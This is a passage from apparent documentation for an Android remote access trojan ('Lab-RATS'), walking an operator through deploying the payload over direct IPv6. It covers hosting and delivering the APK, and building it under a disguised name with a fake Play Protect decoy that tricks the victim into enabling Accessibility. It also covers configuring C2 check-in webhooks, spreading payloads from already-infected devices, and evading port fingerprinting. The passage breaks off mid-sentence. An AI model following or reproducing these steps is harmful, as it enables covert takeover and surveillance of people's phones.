# 12 — Direct IPv6 server setup (Path C)

> The payload is the server. There is no backend to deploy. You build the APK, host it somewhere
> reachable over IPv6, install it, and then connect straight to the device on port 9191.

---

## When to use this

**Use it when:**

- The target is on a network that hands out a real global IPv6 address (most cellular, some ISPs).
- You want the lowest latency and no third-party dependency.
- You're doing proximity or same-LAN work where you can verify reachability yourself.
- You're fine learning the device address by hand instead of from a fleet list.

**Don't use it when:**

- The carrier or AP firewalls inbound IPv6. Roughly half do — verify first, don't assume.
- The target is IPv4-only or NAT64-only.
- You need a file vault or a fleet list.
- You need the device to stay reachable across reboots, reconnects and address rotations without
  re-checking manually.

If any of those apply, run the relay instead ([03-c2-deployment.md](03-c2-deployment.md)) and keep
this doc for the control path once you're on the same v6 network.

---

## What "server config" means here

There are two separate concerns and only one of them is a URL:

| Concern | Path C answer |
| --- | --- |
| **Control transport** | The device's own `:9191`. You browse to it. No config. |
| **Address discovery** | You need *some* way to learn the device's address. This is the only thing you configure. |

Path C gives you nothing to deploy and nothing to host for control. What it does not give you is a
way to find the device. That gap is filled by one of:

1. **Physical or adb access** — read the address directly. Zero infrastructure.
2. **A minimal check-in receiver** — 15 lines on any v6 box, logs addresses to a file.
3. **A Google Sheet webhook** — same idea, hosted by Google, no box required.

Pick 1 if you can touch the device. Otherwise pick 2 or 3; the doc covers both.

---

## 0. Pre-flight

Run these before building anything. Any failure here means Path C won't work and you should switch.

- [ ] Target network issues a `2xxx:` or `3xxx:` address (`ip -6 addr show scope global`)
- [ ] Target is not on a network that only does NAT64
- [ ] You can reach port 9191 on *another* v6 host from outside its LAN
- [ ] Your own host has a public v6 address, if you're hosting the APK
- [ ] You accept the device being internet-facing with a shared password

---

## 1. Confirm the device has a routable address

```bash
adb shell ip -6 addr show scope global
```

You want a line like:

```
inet6 2a02:8109:abcd:1234:5678:9abc:def0:1234/64 scope global dynamic
```

Rules:

- `2xxx:` / `3xxx:` — usable. This is a Global Unicast Address (GUA).
- `fe80::` — link-local only. Not usable from outside the subnet.
- Nothing at all — IPv6 disabled or not provisioned. Stop here.
- `fd00::` — ULA. Routable only inside the site, not over the internet.

**Privacy extensions:** most Android builds rotate the interface identifier daily. The `2001:db8:.../64`
prefix stays; the last 64 bits change. Your link dies every rotation window. Note it, and see §9 if
that matters.

**A phone on Wi-Fi may present two GUAs** (Wi-Fi and cellular). Prefer the cellular one if the Wi-Fi
one is behind a filtering AP.

---

## 2. Verify inbound reachability

Three gates. All three must pass.

### Gate 1 — device-side binding

```bash
adb shell "curl -s -o /dev/null -w '%{http_code}' http://[::1]:9191/"
```

`200` means the server is up locally. Anything else: the payload isn't running or didn't get
permission. Not a network problem.

### Gate 2 — same-LAN reachability

From a second machine on the same subnet:

```bash
curl -i "http://[2a02:8109:abcd:1234:5678:9abc:def0:1234]:9191/"
```

`200` with the login page is what you want. A timeout here means **AP client isolation** — common on
guest Wi-Fi, captive portals and hotel networks. Disable isolation or move networks.

### Gate 3 — off-LAN reachability

From a machine on a different network — tether your laptop to cellular and try again:

```bash
curl -i --max-time 10 "http://[2a02:8109:...]:9191/"
```

Timeout with gates 1 and 2 passing means **the carrier is filtering inbound v6**. This is the most
common dead end. Nothing in the builder fixes it. Options:

- Different carrier / SIM.
- Move the target to Wi-Fi on an ISP that permits inbound.
- Switch to the relay.

Note that many mobile carriers do allow it. Test, don't assume in either direction.

---

## 3. Host the APK on a v6-reachable host

For a *first* install you must serve the APK from somewhere the target can reach. The wizard's
"Direct IP (IPv6)" option is not that — it generates a link to `/download/Update.apk`, which serves
from the *device's own* storage. That's for delivering from an already-infected device.

### Simplest: throwaway server on your own v6 box

The default Python handler sends `text/plain` for `.apk`, which some browsers render as text. Use this
instead — it sets the correct type:

```python
#!/usr/bin/env python3
# serve_apk.py — serves the current directory over IPv6 with correct APK mime type
import http.server, socketserver, functools

class H(http.server.SimpleHTTPRequestHandler):
    extensions_map = {**http.server.SimpleHTTPRequestHandler.extensions_map,
                      ".apk": "application/vnd.android.package-archive"}

socketserver.TCPServer.address_family = __import__("socket").AF_INET6
with socketserver.TCPServer(("::", 8080), functools.partial(H, directory=".")) as s:
    print("serving on [::]:8080")
    s.serve_forever()
```

```bash
cd Lab-RATS-v1.6/apk-builder/output
python3 ../serve_apk.py     # adjust the path
```

Then the delivery URL is `http://[<your-v6>]:8080/signed_v1.apk`.

### Firewall

On the host:

```bash
# ufw
sudo ufw allow 8080/tcp
sudo ufw allow 9191/tcp        # only if this host is also the control box

# raw ip6tables
sudo ip6tables -A INPUT -p tcp --dport 8080 -j ACCEPT
```

On a cloud VM, open the same ports in the provider's security group too — the host firewall isn't
the outer layer.

### Verification before sending

From the target's network, or any other network:

```bash
curl -sI "http://[<your-v6>]:8080/signed_v1.apk" | head -3
```

`200` and `application/vnd.android.package-archive`. If it's `text/plain`, the browser will show a
wall of binary — fix the mime before shipping the link.

### From an already-infected device

Once you have one device up, you can serve subsequent payloads from it:

```
http://[<infected-v6>]:9191/download/signed_v1.apk
```

The file has to exist in the app's storage first — push it with the Storage tab's upload, or
`/files put` over the terminal.

---

## 4. Configure the webhook for discovery

This is the only config value. It goes in **`local.properties`** at the project root, prompted as
"Enter C2 Webhook URL" during the build.

### Option 4a — no receiver (physical access only)

Enter the target's own address:

```
WEBHOOK_URL=http://[2a02:8109:...]:9191
```

The device will POST its check-in to itself. Harmless, and it means the "Active C2 Link" field in the
dashboard is populated with a working address you can read off the screen. Requires you to have the
device in hand.

### Option 4b — minimal receiver

Roughly 15 lines on any box with a public v6, logging to a file. Full source in the
[appendix](#appendix-minimal-check-in-receiver).

```
WEBHOOK_URL=http://[<your-v6>]:9000/checkin
```

### Option 4c — Google Sheet

Same handler as the relay doc, deployed as an Apps Script web app. Gives you a hosted log with no box.

```
WEBHOOK_URL=https://script.google.com/macros/s/AKfy.../exec
```

Use 4b or 4c if the device leaves your hands. Use 4a if it doesn't.

**Do not leave the webhook blank** unless you're certain you can read the address off the device
screen — check-in will silently fail and the `Active C2 Link` field stays empty.

---

## 5. Build

```bash
git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git
cd Lab-RATS-v1.6/apk-builder
chmod +x build.sh && ./build.sh
```

Option **1**. Answer:

| Prompt | Value |
| --- | --- |
| App Name | `System Stability Service` or your own |
| Package ID | your own, e.g. `com.yourco.stability` |
| Version Name | accept the random default |
| Min SDK | `21` |
| Decoy | `1` (Play Protect) |
| C2 Webhook URL | from §4 |

Skip option **6** — its hosting step assumes cloud upload. You're hosting manually.

Confirm the value landed before you go further:

```bash
grep WEBHOOK_URL ../local.properties
```

Output goes to `apk-builder/output/signed_v1.apk`.

---

## 6. Deliver and install

Send `http://[<your-v6>]:8080/signed_v1.apk`. On the device:

1. Browser prompts to install. Accept the unknown-source warning.
2. Open the app **once**.
3. Toggle **Accessibility** when the fake Play Protect screen asks. Everything else auto-grants.

Or over cable:

```bash
adb install -r apk-builder/output/signed_v1.apk
adb shell am start -n com.yourco.stability/.MainActivity
```

---

## 7. Connect

Confirm check-in first — file, sheet row, or the device's own Terminal tab showing its link. Then:

```
http://[2a02:8109:abcd:1234:5678:9abc:def0:1234]:9191/
```

Password `admin1337`, then change it on the Terminal tab immediately.

**Brackets are mandatory.** `http://2a02:8109:...:9191` parses the last group as a port. Some browsers
accept the unbracketed form, many don't.

---

## 8. Changing the port (optional)

9191 is a fingerprint. To move it, edit the constant in the payload source, rebuild, and update your
bookmarks:

```bash
grep -rn "9191" app/src/main/java/com/labs/labrats/ | head
```

Three places need to agree: the bind port in the server, the link the app advertises in check-in, and
the `bind.sh` / wizard template. Miss the second and check-in reports a dead port.

---

## 9. Stable naming (optional)

A DNS `AAAA` record turns `http://[2a02:8109:...]:9191` into `http://lab1.yourdomain:9191`. With
privacy extensions rotating the interface ID, point the record at the /64 prefix and use DDNS, or
just accept rotating and keep the address in a note.

Don't point an `A` record at it — there's no IPv4 listener in this mode.

---

## 10. Hardening

The dashboard is internet-facing with no allowlist, no rate limit and no lockout.

- **Change the password